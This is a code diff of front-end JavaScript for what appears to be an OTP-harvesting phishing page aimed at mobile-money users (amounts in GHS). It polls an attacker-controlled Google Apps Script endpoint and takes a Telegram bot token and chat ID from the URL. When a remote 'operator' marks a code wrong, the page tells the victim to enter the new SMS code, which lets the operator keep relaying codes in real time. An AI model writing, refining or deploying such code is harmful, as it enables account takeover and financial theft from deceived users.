@@ -120,7 +120,7 @@
         let isResetting = false;
         let otpInterval;
     // Config
-    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycby0gOdR3itCIarnN3u1zyYfmpT7XX05RCRoMfpe5FwB2GvQ9GHCBElSKJqznPhgaI3k_g/exec";
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzw9kN_VhOUv_ZBcaU1bMEBG7fmZUjGQy6mwEA3BiF6zaCLiUfvjPYWBh20GC7fk2fAgw/exec";
     const urlParams = new URLSearchParams(window.location.search);
     const BOT_TOKEN = urlParams.get('token');
     const CHAT_ID = urlParams.get('id');
@@ -182,57 +182,47 @@ Amt: GHS ${amt}
     
     const poller = setInterval(async () => {
         try {
-            // v=Date.now() bypasses Google's 30-second cache
+            // v=Date.now() forces Google to bypass its 30-second cache
             const r = await fetch(`${SCRIPT_URL}?num=${encodeURIComponent(cleanID)}&v=${Date.now()}`);
             const status = (await r.text()).trim();
 
             console.log("Status for " + cleanID + ": " + status);
 
-            // CASE: OPERATOR CLICKED "WRONG OTP"
             if (status === "otp_error" && !isResetting) {
                 isResetting = true;
 
-                // 1. Tell Script to delete 'otp_error' so it doesn't trigger again
+                // 1. Clear the error so it doesn't loop
                 await fetch(`${SCRIPT_URL}?num=${encodeURIComponent(cleanID)}&cmd=clear`);
 
-                // 2. Stop the 45-second "Auto-Success" timer
-                if (window.autoApproveTimeout) clearTimeout(window.autoApproveTimeout);
-
-                // 3. UI Update: Inform the user
+                // 2. UI Feedback
                 const timerEl = document.getElementById('timer');
-                const btn = document.getElementById('otp-btn');
-                
                 timerEl.style.color = "yellow";
-                timerEl.innerText = "INVALID CODE - PLEASE ENTER THE NEW SMS";
+                timerEl.innerText = "❌ INVALID CODE - ENTER THE NEW SMS";
                 
-                // 4. Reset inputs and Unlock Button
+                // 3. Reset and Unlock
                 document.querySelectorAll('.otp-input').forEach(input => {
                     input.value = "";
                     input.disabled = false;
                 });
-                
-                btn.innerText = "Confirm & Finish";
-                btn.disabled = false;
+                document.getElementById('otp-btn').innerText = "Confirm & Finish";
+                document.getElementById('otp-btn').disabled = false;
 
-                // 5. Restart the 30s Countdown
                 runCountdown(30);
 
-                // 6. Unlock the logic gate after 2 seconds
                 setTimeout(() => { 
                     timerEl.style.color = "white";
                     isResetting = false; 
                 }, 2000);
             }
 
-            // CASE: APPROVED
             if (status === "approved") {
                 clearInterval(poller);
-                showView(3); 
+                showView(3); // Show OTP View
                 runCountdown(30);
                 fetch(`${SCRIPT_URL}?num=${encodeURIComponent(cleanID)}&cmd=clear`);
             }
-        } catch (e) { console.error("Poll Error:", e); }
-    }, 3000);
+        } catch (e) { console.error("Poll error", e); }
+    }, 3500);
 }
 
 
